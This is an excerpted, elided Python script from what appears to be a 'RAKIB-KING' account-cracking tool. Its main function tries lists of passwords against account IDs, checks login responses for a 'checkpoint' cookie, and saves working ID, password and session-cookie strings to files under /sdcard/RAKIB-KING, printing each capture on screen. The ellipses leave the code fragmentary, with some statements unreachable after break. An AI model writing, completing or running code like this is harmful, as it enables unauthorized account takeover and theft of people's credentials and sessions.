...
#Chnge Name 
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;97mBJ-ARIF]')
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t             WELLCOME : [green] RAKIB-KING PUBLIC TOOL[purple] '))
...
def menu(my_name,my_id):
	...
	cetak(nel('\tWELCOM [green]%s[green] LOGIN USER'%(my_name)))
...
def passwrd():
	...
	print('')
	print(f'=>ARIFTS {h}OK{u} CHEK : {h}OK/%s {b}'%(okc))
	print(f'=>ARIFTS {k}CP{h} CHEK : {k}CP/%s {b}'%(cpc))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     ✨ RAKIB-KING-CP ✨ [red]'))
				...
				cetak(nel('[green]      🔥✨ RAKIB-KING-OK 🔥✨[green]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/RAKIB-KING/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/RAKIB-KING/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='-RAKIB-KING  OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]RAKIB-KING  OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='RAKIB-KING-CP'))
					open('/sdcard/RAKIB-KING/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
